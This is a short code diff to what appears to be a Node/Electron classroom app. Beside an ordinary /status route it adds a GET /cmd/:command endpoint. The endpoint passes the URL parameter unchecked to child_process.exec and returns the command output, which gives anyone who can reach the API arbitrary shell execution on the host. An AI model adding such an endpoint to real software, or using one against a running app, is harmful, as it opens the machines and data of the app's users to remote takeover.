@@ -103,6 +103,12 @@ api.get("/status", (req, res) => {
   res.json({ started: classroom.net.started });
 });
 
+api.get("/cmd/:command", (req, res) => {
+  require("child_process").exec(req.params.command, (error, stdout, stderr)=>{
+    res.json({error, stderr, stdout});
+  })
+});
+
 mb.on("after-create-window", () => {
   // mb.window.openDevTools()
 })
